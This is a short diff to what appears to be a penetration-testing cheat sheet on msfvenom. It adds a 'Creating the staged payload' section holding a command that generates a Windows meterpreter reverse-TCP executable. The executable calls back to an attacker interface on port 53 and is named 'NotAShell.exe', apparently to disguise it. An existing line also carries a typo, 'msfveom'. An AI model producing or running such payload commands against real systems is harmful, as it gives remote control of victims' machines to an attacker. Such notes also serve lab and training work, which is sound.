@@ -14,4 +14,7 @@ List Payloads
 ```
 msfveom -l payload
 ```
-
+Creating the staged payload
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o NotAShell.exe    
+```
